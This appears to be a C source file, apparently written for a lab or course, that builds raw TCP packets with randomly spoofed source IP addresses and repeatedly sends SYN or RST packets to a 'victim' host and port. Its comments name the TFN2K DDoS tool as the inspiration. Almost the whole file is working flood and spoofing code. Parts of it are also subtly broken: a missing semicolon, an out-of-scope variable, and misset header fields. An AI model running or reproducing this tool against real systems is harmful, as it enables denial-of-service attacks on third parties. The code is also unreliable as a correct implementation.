/**
*The file create and send packer to victim
*Author Alexey Titov
*Version 1.0
**/
//library
#include "CreAndSenPac.h"
//Inspired by TFNK2K
typedef struct tfn2k_tcphdr{
    unsigned short int src, dst;    /* source and dest address */
    unsigned int seq, ack;
    #if __BYTE_ORDER == __LITTLE_ENDIAN
        unsigned char x2:4, off:4;      /*header length and version */
    #endif
    #if __BYTE_ORDER == __BIG_ENDIAN
        unsigned char off:4, x2:4;      /*version and header length*/
    #endif
    unsigned char flg;			/* flag1 | flag2 */
    #define FIN  0x01
    #define SYN  0x02
    #define RST  0x04
    #define PUSH 0x08
    #define ACK  0x10
    #define URG  0x20
    unsigned short int win, urp;
    unsigned short int sum;       /* checksum */  
  }tcp;

//Need this header for TCP Checksum calculation - RFC 793
typedef struct _pseudoheader{
	unsigned int src_ip;
	unsigned int dst_ip;
	unsigned char reserved;        /* 8 bits of zero */
	unsigned char protocol;
	unsigned short int len;        /* Total length */
}pseudo_hdr;

//this function compute checksum (RFC 1071)
//source: https://stackoverflow.com/questions/30855053/rfc-1071-calculating-ip-header-checksum-confusion-in-c
unsigned short calculate_checksum(unsigned short * iphead, const int len){
	int count = len;
    unsigned short * tmp_head = iphead;
	unsigned long int sum = 0;
    unsigned short checksum = 0;

    while(count > 1) {
        sum += * (unsigned short *) (tmp_head);
        count -=2;
        tmp_head++;
    }

    if(count > 0) {
        sum += * (unsigned short *) (tmp_head);
    }

    // add back carry outs from top 16 bits to low 16 bits
	sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
	sum += (sum >> 16);                 // add carry
    checksum = ~sum;                    // truncate to 16 bits                    

    return checksum;
}

//this function builds the new packet, and sends it to victim's IP
void CreateAndSend(const char * dstAddr, const int dstPort, const int isSyn, const int number){
    struct iphdr ip;     // IPv4 header
    tcp tcphdr;          // TCP-header
    pseudo_hdr ipPseudo; //ip pseudo header for TCP checksum
    char data[IP_MAXPACKET] = "You're a test mouse which attacked by Syn/Rst attack.\n";
    int datalen = strlen(data) + 1;
    int num=number;
    char srcAddr[IP_LENGTH+1]; // Will represent the randomized source IP Address
    while(num--){
        //initialization
	    memset(&ip,0,sizeof(struct iphdr));
	    memset(&tcphdr,0,sizeof(tcp));
	    memset(&ipPseudo,0,sizeof(pseudo_hdr));

        //===================
        // IP header
        //===================

        ip.version = IPVERSION;     //Protocol version
        ip.ihl = 5;                 //Ip header Length
        ip.tos = 0;                 //Type of service
        ip.tot_len = htons(sizeof(ip) + sizeof(tcp)+datalen); //Total Length
        ip.id = 0;                  //ID - not in use, no fragmentation
        ip.frag_off = 0;            //Fragment offset
        ip.ttl = MAXTTL;            //Time to live
        ip.protocol = IPPROTO_TCP;  //4th layer protocol
        ip.saddr = RandomIP();      //Source IP Address
	    if (ip.saddr == -1)
            return; //ERROR CODE FROM RandomIP (MEMORY ALLOCATION)
        ip.daddr = inet_addr(dstAddr); //Destination IP Address - given by the user (default: 127.0.0.1)
        ip.check = 0;                  //Avoiding next row (checksum calculation), from calculating this field
        ip.check = calculate_checksum((unsigned short *) &ip, IP4_HDRLEN); //Calculating checksum

        //==============================================
        // IP Pseudo Header for calculating TCP Checksum
        //==============================================
        ipPseudo.src_ip = ip.saddr;         //Source IP Addres
        ipPseudo.dst_ip = ip.daddr;         //Destination IP Address
        ipPseudo.reserved = 0;              //Reserved - zero
        ipPseudo.protocol = ip.protocol;    //4th layer protocol
        ipPseudo.len = htons(ntohs(ip.tot_len) - (ip.ihl * 4)); //IP Header Length

        //==============================
        // TCP header (inspired by TFN2K)
        //==============================

        tcphdr.src = htons (getRandom(MAX_PORT_NUM));
        tcphdr.dst = htons(dstPort);
        tcphdr.seq = htonl ((getRandom(MAX_PORT_NUM)+getRandom(MAX_PORT_NUM)) << 8);
        tcphdr.ack = htons (getRandom(MAX_PORT_NUM));
        if (isSyn) 
            tcphdr.flg = SYN | URG;
        else
            tcphdr.flg = RST | URG;
        tcphdr.win = htons (getRandom(MAX_PORT_NUM));
        tcphdr.off = sizeof(tcp)+datalen;
        tcphdr.urp = htons (getRandom(MAX_PORT_NUM));
        tcphdr.sum = 0; //Checksum won't calc this

	    //Copy tcp header and IP pseudo header to a same block
	    //Calculate TCP checksum and add it to the tcp header
	    u_char tcpBlockToCksum[sizeof(pseudo_hdr)+TCP_HDRLEN+IP_MAXPACKET];
	    memcpy(tcpBlockToCksum, &ipPseudo, sizeof(pseudo_hdr));                 //Copy IP pseduo header
	    memcpy(tcpBlockToCksum+sizeof(pseudo_hdr), &tcphdr, TCP_HDRLEN);        //Copy TCP header
	    memcpy(tcpBlockToCksum+sizeof(pseudo_hdr)+TCP_HDRLEN, &data, datalen);  //Copy data
        tcphdr.sum = calculate_checksum((unsigned short *) &tcpBlockToCksum,sizeof(pseudo_hdr)+TCP_HDRLEN+datalen);

        //======================================================
        // Unite all the headers, create socket, send the packet
        //======================================================

	    //Copy all the needed data to 'packet' before sending
	    char packet[IP_MAXPACKET];                              //The complete final packet which will be sent
	    memset(&packet,0,IP_MAXPACKET);
	    memcpy(packet, &ip, IP4_HDRLEN);                        //Copy ip header to the 'being sent' packet
	    memcpy(packet+IP4_HDRLEN, &tcphdr,sizeof(tcphdr) );     //Copy TCP header to the 'being sent' packet
	    memcpy(packet+IP4_HDRLEN+TCP_HDRLEN, &data,datalen );   //Copy data to the 'being sent' packet

        // Create raw socket for IP-RAW
        int sock = -1;
        if ((sock = socket (AF_UNSPEC, SOCK_RAW, IPPROTO_RAW)) == -1){
            fprintf (stderr, "socket() failed with error: %d", errno);
            fprintf (stderr, "ERROR! the process needs to be run by Admin/root user.\n\n");
            return;
        }

        // This socket option IP_HDRINCL says that we are building IPv4 header by ourselves, and
        // the networking in kernel is in charge only for Ethernet header.
        const int flagOne = 1;
        if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, &flagOne, sizeof (flagOne)) == -1){
            fprintf (stderr, "setsockopt() failed with error: %d", errno);
            return;
        }

        struct sockaddr_in dstIp;
        dstIp.sin_family = AF_UNSPEC;
        inet_pton(AF_UNSPEC, dstAddr, &(dstIp.sin_addr));

	    puts("Start packet sending:");
	    printf("\tSource IP: %s , Destination IP: %s\n",srcAddr,dstAddr);
	    puts("\tTCP Flag: ");
	    if(!isSyn)
            puts("RST");
	    else
            puts("SYN");
	    printf("\tDestination Port: %d\n",dstPort);

        // Send the packet using sendto() for sending datagrams.
        if (sendto (sock, packet, IP4_HDRLEN + TCP_HDRLEN + datalen, 0, (struct sockaddr *) &dstIp, sizeof (dstIp)) == -1){
            fprintf (stderr, "sendto() failed with error: %d", errno);
            return;
        }
	    puts("Packet was sent successfully");

        close(sock);
    }
}

//this function generates a random correct IP Address
unsigned int RandomIP(){
    srand(time(NULL));
	struct sockaddr_in ipTMP;    //Will be used to check if the ip is correct

	int flagIP = 0;              //Flag indicates if the ip is correct
		while (!flagIP){
		    int firstOct = getRandom(MAX_IP);
		    while (firstOct == 10 || firstOct == 127 || firstOct ==192 || firstOct ==0)
			firstOct = getRandom(MAX_IP);             //Avoid getting private ip address as source IP
		    int secondOct = getRandom(MAX_IP);
		    int thirdOct = getRandom(MAX_IP);
		    int fourthOct = getRandom(MAX_IP-1);      //last between 0-254
			char * ipString;
			mallocString(firstOct,secondOct,thirdOct,fourthOct,&ipString); //Allocates string (ip length) on heap
			flagIP = checkIP(ipString);               //Check if this ip is correct
			if(ipString!=NULL){
				if (flagIP) 
                    inet_pton(AF_INET, ipString, &(ipTMP.sin_addr));
				strcpy(srcAddr,ipString);
				free(ipString);
                ipString=NULL;
			}else {
				puts("Err, CANNOT ALLOCATE MEMORY ON HEAP.\nprocess finish");
				return -1;
			}
		}
	return ipTMP.sin_addr.s_addr;
}

//this function returns a number integer between 0-max
int getRandom(const int max){
    return rand()%(max+1)
}

//this function allocates memory on the heap for the valid ip address (char *)
void mallocString(const int a, const int b,const int c,const int d, char ** str){
    int size=4;     //3 points and \0
    size+=Lenght(a);
    size+=Lenght(b);
    size+=Lenght(c);
    size+=Lenght(d);
	(*str) = (char *)malloc(sizeof(char)*(size));   // xxx.xxx.xxx.xxx\0
	sprintf((*str),"%d.%d.%d.%d",a,b,c,d);          //Copy the ip to the allocated string
}

//this function returns length of int a
int Lenght(int a){
    int len = 1;
	while (a>9){
		a=a/10;
		++len;
	}
	return len;
}